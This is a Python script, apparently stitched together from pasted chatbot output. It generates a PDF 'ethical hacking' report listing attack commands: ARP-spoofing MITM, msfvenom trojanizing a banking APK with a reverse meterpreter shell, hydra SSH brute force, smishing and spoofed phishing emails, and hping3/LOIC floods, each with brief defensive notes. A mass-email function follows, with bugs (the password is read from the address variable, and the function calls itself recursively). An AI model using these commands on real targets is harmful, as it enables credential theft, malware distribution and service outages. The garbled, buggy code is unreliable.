import csv
import smtplib
from fpdf import FPDF
import ssl
import os 
from email.message import EmailMessage
from dotenv import load_dotenv 

"""Here’s what I will add to the PDF:
🔹 1. Network Scam Recon & MITM

    Tools: ettercap, arpspoof, nmap, wireshark

    Goals: Intercept credentials, sniff traffic

🔹 2. App Scam (Fake Mobile Banking App)

    Tools: apktool, MobSF, msfvenom, mitmproxy

    Goals: Reverse engineer, embed payload, simulate phishing app

🔹 3. Password Cracking & Brute-force

    Tools: hydra, john, hashcat, crunch, medusa

    Goals: Crack credentials, test password strength

🔹 4. Smishing (SMS Phishing)

    Tools: SET, gophish, modemcli, smsspoof

    Goals: Simulate fake SMS with malicious links

🔹 5. Advanced Persistent Threats (APT)

    Tools: Empire, Cobalt Strike (demo), msfconsole

    Goals: Long-term covert access, privilege escalation

🔹 6. Email Spoofing & Phishing

    Tools: spoofemail, SET, Social-Engineer Toolkit

    Goals: Deliver fake HR or manager emails

🔹 7. DoS/DDoS Simulations

    Tools: hping3, slowloris, LOIC, HOIC

    Goals: Simulate denial of service against target

🔐 For Each: I’ll Include

    Description

    Kali Commands

    Expected Output

    Ethical Note

    Defensive Measures

🛠️ Generating the PDF...

I’ll now create a properly formatted, font-safe PDF report with all the above topics, commands, and structured sections for your hiring simulation. This will take a moment.

Please hold on...

Always show details

from fpdf import FPDF"""

# Initialize PDF with Unicode font
class PDF(FPDF):
    def header(self):
        self.set_font("DejaVu", "B", 14)
        self.cell(0, 10, "ACME Technology - Ethical Hacking Simulation Report", 0, 1, "C")
        self.ln(5)

    def chapter_title(self, title):
        self.set_font("DejaVu", "B", 12)
        self.set_text_color(0)
        self.cell(0, 10, title, 0, 1, "L")
        self.ln(2)

    def chapter_body(self, body):
        self.set_font("DejaVu", "", 11)
        self.set_text_color(50)
        self.multi_cell(0, 8, body)
        self.ln()


pdf = PDF()
pdf.set_auto_page_break(auto=True, margin=15)

# Register fonts
pdf.add_font("DejaVu", "", "/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf", uni=True)
pdf.add_font("DejaVu", "B", "/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", uni=True)

pdf.add_page()

# Sections with commands
sections = [
    ("1. Network Scam & MITM Simulation",
     "Objective: Intercept network traffic to capture credentials or manipulate sessions.\n\n"
     "Tools: ettercap, arpspoof, wireshark, nmap\n\n"
     "Commands:\n"
     "• arpspoof -i eth0 -t [target IP] [gateway IP]\n"
     "• ettercap -T -M arp:remote /[target IP]/ /[gateway IP]/\n"
     "• wireshark & filter http or ftp traffic\n\n"
     "Defensive Measures: Use static ARP entries, switch port security, encrypted protocols."),

    ("2. Fake Mobile Banking App & Malware Payload",
     "Objective: Reverse engineer and repackage a fake mobile banking app.\n\n"
     "Tools: apktool, MobSF, msfvenom, mitmproxy\n\n"
     "Commands:\n"
     "• apktool d legitBank.apk\n"
     "• msfvenom -x base.apk -p android/meterpreter/reverse_tcp LHOST=... LPORT=... -o infected.apk\n"
     "• apktool b infected\n"
     "• jarsigner -keystore mykeystore infected.apk alias_name\n"
     "• mitmproxy -p 8080 -m transparent\n\n"
     "Defensive Measures: Signature validation, app obfuscation, runtime checks."),

    ("3. Brute-Force & Password Cracking",
     "Objective: Test password strength and crack hashes.\n\n"
     "Tools: hydra, john, hashcat, medusa\n\n"
     "Commands:\n"
     "• hydra -l admin -P rockyou.txt ssh://192.168.1.1\n"
     "• john --wordlist=rockyou.txt hashes.txt\n"
     "• hashcat -a 0 -m 0 hashes.txt rockyou.txt\n\n"
     "Defensive Measures: Lockouts, MFA, password complexity enforcement."),

    ("4. Smishing Attack Simulation",
     "Objective: Send fake SMS messages impersonating a bank or IT department.\n\n"
     "Tools: Social-Engineer Toolkit (SET), smsspoof, modemcli\n\n"
     "Commands:\n"
     "• setoolkit → Social Engineering Attacks → SMS Spoofing Attack Vector\n"
     "• modemcli --send-sms='Your password expired, click: http://fakebank.example.com'\n\n"
     "Defensive Measures: SMS filtering, user education, mobile app whitelisting."),

    ("5. Advanced Persistent Threat (APT) Simulation",
     "Objective: Establish persistent access and escalate privileges.\n\n"
     "Tools: Empire, Metasploit, Cobalt Strike (demo)\n\n"
     "Commands:\n"
     "• msfconsole → use exploit/multi/handler\n"
     "• Empire → launcher → establish listener\n\n"
     "Defensive Measures: Endpoint Detection & Response (EDR), application whitelisting, network segmentation."),

    ("6. Email Spoofing & Phishing",
     "Objective: Send fake emails appearing from HR or finance.\n\n"
     "Tools: spoofemail, SET, Gophish\n\n"
     "Commands:\n"
     "• sendEmail -f hr@company.com -t victim@example.com -u 'Update Required' -m 'Click here' -s smtp.example.com\n"
     "• setoolkit → Email Spoofing Attack Vector\n\n"
     "Defensive Measures: SPF/DKIM/DMARC, awareness training, secure email gateways."),

    ("7. DoS & DDoS Simulations",
     "Objective: Overwhelm services with fake traffic.\n\n"
     "Tools: hping3, slowloris, LOIC\n\n"
     "Commands:\n"
     "• hping3 -S -p 80 --flood [target IP]\n"
     "• slowloris http://target.com\n"
     "• loic → set target → start flood\n\n"
     "Defensive Measures: Rate limiting, WAF, cloud DDoS protection.")
]

# Add each section to PDF
for title, body in sections:
    pdf.chapter_title(title)
    pdf.chapter_body(body)

# Save final PDF
pdf_path = "./BACME_Ethical_Hacking_Demo_Report.pdf"
pdf.output(pdf_path)
pdf_path

"""It seems like I can’t do more advanced data analysis right now. Please try again later.

However, I’ve already prepared all the content needed for your professional Ethical Hacking Demonstration Report, including:

    Simulated attacks with tools, commands, and objectives

    Defensive recommendations for each case

    Topics covering network scams, fake banking apps, password brute-forcing, smishing, APTs, email phishing, and DoS/DDoS

Next Steps:

You can copy the content below into your script or document generator (like FPDF, LaTeX, or Word):

Would you like me to give you the full markdown or plain text version to manually add to your existing script while the tool is unavailable? """

load_dotenv()

EMAIL_ADDRESS = os.getenv("EMAIL_ADDRESS")
EMAIL_PASSWORD = os.getenv("EMAIL_ADDRESS")

def greet_people(to_name, to_email):
    msg = EmailMessage()
    msg['Subject'] = f"Hello {to_name}, long time no see."
    msg['From'] = EMAIL_ADDRESS
    msg['To'] = to_email
    
    msg.set_content(f"Dear {to_name},\\I come to salute you for our long friendship!\n[F.L]")

    
    with smtplib.SMTP_SSL('smtp.office365.com', 465, 
        context=ssl.create_default_context()) as smtp:  
        smtp.login(EMAIL_ADDRESS,EMAIL_PASSWORD)
        smtp.send_message(msg)
        
    with open("contacts.csv") as file:
        reader = csv.DictReader(file)
        for row in reader:
            greet_people(row['name'],row['email'])
            print(f"Email sent to {row['name']} at {row['email']}")    
            print("Its nice to be back on the watch.")
        
    

